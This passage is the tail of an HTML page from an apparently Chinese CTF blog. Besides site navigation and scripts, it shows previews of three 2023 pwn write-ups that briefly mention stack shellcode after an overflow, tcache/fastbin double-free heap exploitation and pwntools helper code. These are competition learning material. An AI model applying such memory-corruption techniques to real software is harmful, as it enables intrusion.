  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">文章内容</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">相关文章</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/2023%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%9B%BD%E5%AE%B6%E6%8A%80%E8%83%BD%E5%8F%91%E5%B1%95%E4%B8%8E%E6%8A%80%E6%9C%AF%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9C%A8%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8-Pwn-WriteUps/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700395200"
  data-df="YYYY/MM/DD"
  
>
  2023/11/19
</time>

              <h4 class="pt-0 my-2">2023一带一路暨金砖国家技能发展与技术创新大赛之网络安全在企业信息管理中的应用-Pwn-WriteUps</h4>
              <div class="text-muted">
                <p>
                  





                  ‍
‍

‍

pwn-pwn0402

‍

​​​​

‍


  我们采用溢出后再次read  然后写shellcode 在栈上ret


‍

​​

‍

​​

from pwn import *
s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.s...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/2023%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BPwn-%E5%88%86%E6%9E%90/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700481600"
  data-df="YYYY/MM/DD"
  
>
  2023/11/20
</time>

              <h4 class="pt-0 my-2">2023香山杯决赛Pwn-分析</h4>
              <div class="text-muted">
                <p>
                  





                  
  进决赛了，但是和金砖的比赛冲突了决赛没时间去了呜呜呜😭😭😭，选择去打金砖了，好打一点。


camera

‍

程序分析

‍

​​

‍

根据程序的功能然后加上一些手法，可以double free

后面就是填满 tcachebins 然后 fastbin double free 就好了

‍

​​

‍

‍

cat 用的顺手了，我就直接用 cat  ORW 就好了

​...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700913600"
  data-df="YYYY/MM/DD"
  
>
  2023/11/25
</time>

              <h4 class="pt-0 my-2">2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups</h4>
              <div class="text-muted">
                <p>
                  





                  ‍

‍
DASCTF X CBCTF 2023｜无畏者先行

‍

‍

Pwn-ASadStory

‍


  保护


​​


  沙箱


​​

‍


  exploit


from pwn import *
s       = lambda data               :io.send(data)
sa      = lambda delim,data     ...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/CISCN-2023-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-AWDPlus-pwn-%E9%A2%98%E5%A4%8D%E7%8E%B0/"
      class="btn btn-outline-primary"
      aria-label="上一篇"
    >
      <p>CISCN 2023 华东北赛区 AWDPlus pwn 题复现</p>
    </a>
  

  
    <a
      href="/posts/Announcements/"
      class="btn btn-outline-primary"
      aria-label="下一篇"
    >
      <p>Announcements</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imLZH1/me_giscus_Discussions-',
      'data-repo-id': 'comments',
      'data-category': 'general',
      'data-category-id': '',
      'data-mapping': 'pathname',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'bottom',
      'data-lang': 'zh-CN',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    <a href="https://user.qzone.qq.com/3461665835">imLZH1</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。"
      >保留部分权利。</span>
    
  </p>
	<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>

  <p>本站采用 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 主题 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">发现新版本的内容。</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      更新
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    <script src="/assets/lib/jquery/jquery.min.js"></script>
  

  
    <script src="/assets/lib/bootstrap/bootstrap.bundle.min.js"></script>
  

  
    <script src="/assets/lib/simple-jekyll-search/simple-jekyll-search.min.js"></script>
  

  
    <script src="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.umd.min.js"></script>
  

  
    <script src="/assets/lib/magnific-popup/jquery.magnific-popup.min.js"></script>
  

  
    <script src="/assets/lib/clipboard/clipboard.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/dayjs.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/locale/en.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/relativeTime.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/localizedFormat.min.js"></script>
  

  
    <script src="/assets/lib/tocbot/tocbot.min.js"></script>
  








<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

